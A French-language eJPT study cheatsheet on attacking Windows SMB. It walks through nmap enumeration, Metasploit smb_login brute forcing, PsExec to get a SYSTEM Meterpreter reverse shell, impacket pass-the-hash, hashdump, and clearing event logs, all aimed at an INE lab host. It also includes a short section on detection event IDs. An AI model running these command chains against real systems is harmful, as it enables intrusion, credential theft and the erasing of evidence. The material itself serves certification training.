# üíª SMB PsExec Exploitation - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de PsExec

### Qu'est-ce que PsExec ?
**PsExec** (Process Execute) est un outil Microsoft qui permet :
- üñ•Ô∏è **Ex√©cution distante** de commandes via SMB
- üîê **Authentification** avec credentials Windows
- üöÄ **Installation temporaire** d'un service sur la cible
- üíæ **Upload/ex√©cution** de binaires sur le syst√®me distant
- üîí **Privil√®ges SYSTEM** automatiques

### Fonctionnement PsExec
1. **Connexion SMB** √† la cible avec credentials
2. **Upload du payload** via partage ADMIN$
3. **Cr√©ation d'un service** temporaire
4. **Ex√©cution** du payload en tant que SYSTEM
5. **Communication** via named pipes
6. **Nettoyage** automatique apr√®s usage

### Conditions requises PsExec
- ‚úÖ **Credentials valides** (local admin ou domain admin)
- ‚úÖ **Port SMB ouvert** (139 ou 445)
- ‚úÖ **Partages admin** accessibles (ADMIN$, C$)
- ‚úÖ **Service** "RemoteRegistry" actif
- ‚úÖ **Firewall** autorisant SMB

---

## üîç 2. Reconnaissance SMB

### Scan de d√©couverte initial
```bash
# Scan de base
nmap demo.ine.local
nmap -p139,445 demo.ine.local

# Scan avec d√©tection de version
nmap -sV -p139,445 demo.ine.local

# Scan des protocoles SMB
nmap -p445 --script smb-protocols demo.ine.local
```

### √ânum√©ration SMB avanc√©e
```bash
# Scripts SMB essentiels
nmap -p445 --script smb-os-discovery demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
nmap -p445 --script smb-enum-shares demo.ine.local

# V√©rification des vuln√©rabilit√©s
nmap -p445 --script smb-vuln-* demo.ine.local

# √ânum√©ration compl√®te
enum4linux demo.ine.local
smbclient -L demo.ine.local
```

### V√©rification des pr√©requis PsExec
```bash
# Test d'acc√®s aux partages admin
smbclient //demo.ine.local/ADMIN$ -U username
smbclient //demo.ine.local/C$ -U username

# Test avec null session
smbclient -L demo.ine.local -N
rpcclient -U "" demo.ine.local
```

---

## üîê 3. Brute Force SMB avec Metasploit

### Module smb_login (Essentiel eJPT)
```bash
# Lancement Metasploit
msfconsole -q

# Configuration module brute force
use auxiliary/scanner/smb/smb_login
show options

# Configuration de base
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set THREADS 16
exploit
```

### Options du module smb_login
| Option | Description | Valeur recommand√©e |
|--------|-------------|-------------------|
| `RHOSTS` | IP(s) cible(s) | demo.ine.local |
| `USER_FILE` | Liste d'utilisateurs | common_users.txt |
| `PASS_FILE` | Liste de mots de passe | unix_passwords.txt |
| `SMBUser` | Utilisateur unique | Administrator |
| `SMBPass` | Mot de passe unique | password123 |
| `VERBOSE` | Mode verbose | false (pour eJPT) |
| `THREADS` | Nombre de threads | 16 |
| `BLANK_PASSWORDS` | Test mots de passe vides | true |
| `USER_AS_PASS` | Username = password | true |

### Wordlists Metasploit essentielles
```bash
# Localisation wordlists MSF
ls /usr/share/metasploit-framework/data/wordlists/

# Principales wordlists
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
/usr/share/metasploit-framework/data/wordlists/passwords.lst

# Wordlists sp√©cialis√©es Windows
/usr/share/metasploit-framework/data/wordlists/common_roots.txt
/usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
```

### Configuration brute force optimis√©e
```bash
# Configuration compl√®te pour eJPT
use auxiliary/scanner/smb/smb_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set BLANK_PASSWORDS true
set USER_AS_PASS true
set VERBOSE false
set THREADS 16
set STOP_ON_SUCCESS true
exploit
```

### Interpr√©tation des r√©sultats
```bash
# R√©sultats typiques attendus :
[+] 192.168.1.100:445 - Success: '.\Administrator:qwertyuiop'
[+] 192.168.1.100:445 - Success: '.\guest:'
[+] 192.168.1.100:445 - Success: '.\user:password'
[+] 192.168.1.100:445 - Success: '.\backup:backup123'

# Format : IP:PORT - Success: 'DOMAIN\USER:PASSWORD'
```

---

## üí• 4. Exploitation PsExec avec Metasploit

### Module PsExec (windows/smb/psexec)
```bash
# Configuration module PsExec
msfconsole -q
use exploit/windows/smb/psexec
show options

# Configuration avec credentials trouv√©s
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
set LHOST your_kali_ip
set LPORT 4444

# V√©rification avant exploitation
show options
show targets
show payloads

# Lancement exploitation
exploit
```

### Options du module PsExec
| Option | Description | Valeur exemple |
|--------|-------------|----------------|
| `RHOSTS` | IP cible | demo.ine.local |
| `SMBUser` | Utilisateur admin | Administrator |
| `SMBPass` | Mot de passe | qwertyuiop |
| `SMBDomain` | Domaine (optionnel) | WORKGROUP |
| `LHOST` | IP attaquant | your_kali_ip |
| `LPORT` | Port d'√©coute | 4444 |
| `SERVICE_NAME` | Nom du service | Al√©atoire |
| `SERVICE_DESCRIPTION` | Description service | Windows Service |

### Payloads recommand√©s PsExec
```bash
# Payload par d√©faut (recommand√©)
windows/meterpreter/reverse_tcp

# Alternatives
windows/shell/reverse_tcp              # Shell simple
windows/meterpreter/bind_tcp            # Bind shell
windows/x64/meterpreter/reverse_tcp     # 64-bit
windows/vncinject/reverse_tcp           # VNC injection
```

### Workflow complet PsExec
```bash
# √âtape 1 : Brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit

# √âtape 2 : Noter les credentials trouv√©s
# Exemple : Administrator:qwertyuiop

# √âtape 3 : Exploitation PsExec
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
set LHOST your_kali_ip
exploit

# √âtape 4 : Session Meterpreter obtenue
getuid                                 # NT AUTHORITY\SYSTEM
```

---

## üñ•Ô∏è 5. Post-exploitation via PsExec

### Commandes Meterpreter essentielles
```bash
# V√©rification acc√®s
getuid                                 # NT AUTHORITY\SYSTEM
sysinfo                               # Informations syst√®me
getpid                                # Process ID

# Navigation syst√®me
pwd                                   # R√©pertoire actuel
ls                                    # Contenu r√©pertoire
cd C:\\                               # Changer r√©pertoire

# Shell Windows
shell                                 # Passer en shell cmd
cd /                                  # Aller √† la racine (C:\)
dir                                   # Lister contenu
type flag.txt                         # Lire fichier flag
exit                                  # Retour Meterpreter
```

### √ânum√©ration syst√®me post-PsExec
```bash
# Dans session Meterpreter
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/hashdump

# Migration processus (optionnel)
ps                                    # Lister processus
migrate <pid_explorer>                # Migrer vers explorer.exe
```

### Recherche de flag eJPT
```bash
# M√©thode 1 : Via shell
shell
cd /
dir
type flag.txt

# M√©thode 2 : Via Meterpreter
search -f flag.txt
download C:\\flag.txt
cat flag.txt

# M√©thode 3 : Recherche √©tendue
search -f *.txt
search -d C:\\ -f flag*
```

---

## üîß 6. Techniques alternatives PsExec

### PsExec manuel (impacket)
```bash
# Installation impacket
pip install impacket

# Utilisation psexec.py
psexec.py Administrator:qwertyuiop@demo.ine.local
psexec.py domain/Administrator:password@demo.ine.local

# Avec hash NTLM
psexec.py Administrator@demo.ine.local -hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash
```

### WMIExec (alternative PsExec)
```bash
# Avec impacket wmiexec
wmiexec.py Administrator:qwertyuiop@demo.ine.local

# Module Metasploit WMI
use exploit/windows/local/wmi
use auxiliary/scanner/wmi/wmi_login
```

### SMBExec (plus discret)
```bash
# Alternative plus furtive
smbexec.py Administrator:qwertyuiop@demo.ine.local

# Module Metasploit
use exploit/windows/smb/smb_delivery
```

---

## üõ°Ô∏è 7. D√©tection et contre-mesures

### √âv√©nements Windows g√©n√©r√©s par PsExec
```powershell
# Logs d'√©v√©nements √† surveiller
# Event ID 7034: Service terminated unexpectedly
# Event ID 7035: Service control manager
# Event ID 4624: Account logon (Type 3 - Network)
# Event ID 4672: Special privileges assigned
# Event ID 5140: Network share accessed

Get-EventLog -LogName System | Where-Object {$_.EventID -eq 7034}
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624}
```

### Artefacts PsExec sur le syst√®me
```bash
# Fichiers temporaires cr√©√©s
C:\Windows\PSEXESVC.exe               # Service PsExec
C:\Windows\Temp\*.tmp                 # Fichiers temporaires

# Services cr√©√©s (noms al√©atoires)
sc query | findstr PSEXESVC
```

### Nettoyage post-exploitation
```bash
# Dans session Meterpreter
clearev                               # Nettoyer logs √©v√©nements

# Suppression manuelle artefacts
rm C:\\Windows\\PSEXESVC.exe
execute -f sc -a "delete malicious_service"
```

---

## üéØ 8. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: SMB ‚Üí Brute force ‚Üí PsExec
```bash
# 1. D√©couverte SMB
nmap -p445 --script smb-protocols demo.ine.local

# 2. Brute force credentials
use auxiliary/scanner/smb/smb_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit

# 3. Exploitation PsExec
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

# 4. Recherche flag
shell
cd /
type flag.txt
```

### Sc√©nario 2: Credentials connus ‚Üí PsExec direct
```bash
# Si credentials fournis dans l'√©nonc√©
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass password_from_lab
set LHOST your_kali_ip
exploit

# Post-exploitation imm√©diate
getuid
shell
cd /
dir
type flag.txt
```

### Sc√©nario 3: Multiples cibles PsExec
```bash
# Pour plusieurs cibles
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100-110
set SMBUser Administrator
set SMBPass found_password
set LHOST your_kali_ip
exploit

# Gestion multiples sessions
sessions -l
sessions -i 1
```

---

## üí° 9. Conseils et astuces eJPT

### Points critiques PsExec eJPT
- ‚úÖ **Brute force SMB** toujours en premier
- ‚úÖ **Wordlists MSF** int√©gr√©es tr√®s efficaces
- ‚úÖ **VERBOSE false** pour √©viter spam
- ‚úÖ **Privileges SYSTEM** automatiques
- ‚úÖ **Shell command** pour navigation simple

### Erreurs courantes √† √©viter
- ‚ùå **Oublier brute force** avant PsExec
- ‚ùå **VERBOSE true** ‚Üí Output trop verbeux
- ‚ùå **Mauvais LHOST** ‚Üí Session √©choue
- ‚ùå **Ne pas tester** credentials trouv√©s
- ‚ùå **Ignorer autres users** trouv√©s

### Optimisations eJPT
```bash
# Configuration rapide brute force
set BLANK_PASSWORDS true
set USER_AS_PASS true
set STOP_ON_SUCCESS true
set THREADS 16

# Test rapide credentials courants
set SMBUser Administrator
set SMBPass admin
check                                 # Test avant exploit
```

### Workflow optimis√© examen
```bash
# One-shot brute force + exploitation
msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS demo.ine.local; set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set VERBOSE false; exploit; use exploit/windows/smb/psexec; set RHOSTS demo.ine.local; set SMBUser Administrator; set SMBPass qwertyuiop; set LHOST your_kali_ip; exploit"
```

### Credentials Windows courants eJPT
```bash
# Utilisateurs fr√©quents
Administrator:password
Administrator:admin
Administrator:123456
Administrator:qwertyuiop            # Comme dans l'exemple
admin:admin
guest:guest
user:password
backup:backup
```

---

## üìã 10. Checklist exploitation PsExec

### ‚úÖ Phase de reconnaissance
- [ ] **Port SMB 445** ouvert et accessible
- [ ] **Protocoles SMB** identifi√©s
- [ ] **Partages admin** (ADMIN$, C$) d√©tect√©s
- [ ] **OS Windows** confirm√©

### ‚úÖ Phase de brute force
- [ ] **Module smb_login** configur√©
- [ ] **Wordlists appropri√©es** s√©lectionn√©es
- [ ] **Options optimis√©es** (VERBOSE false, THREADS 16)
- [ ] **Credentials valides** trouv√©s et not√©s

### ‚úÖ Phase d'exploitation
- [ ] **Module PsExec** configur√©
- [ ] **Credentials** correctement saisis
- [ ] **LHOST/LPORT** configur√©s
- [ ] **Session Meterpreter** obtenue
- [ ] **Privil√®ges SYSTEM** confirm√©s

### ‚úÖ Phase post-exploitation
- [ ] **Navigation syst√®me** test√©e
- [ ] **Flag** localis√© et lu
- [ ] **√ânum√©ration** compl√©mentaire effectu√©e
- [ ] **Persistence** install√©e si n√©cessaire

### üìù Informations √† documenter
- **Credentials trouv√©s** : User:Password
- **M√©thode d'acc√®s** : PsExec
- **Privil√®ges obtenus** : SYSTEM
- **Localisation flag** : C:\flag.txt
- **Sessions actives** : IDs Meterpreter

**üéØ Conseil final eJPT :** PsExec est une technique **fondamentale** dans l'eJPT pour les environnements Windows. Le combo brute force SMB ‚Üí PsExec donne acc√®s SYSTEM direct. Toujours commencer par `smb_login` avec les wordlists MSF int√©gr√©es, puis exploiter avec `psexec` les credentials trouv√©s !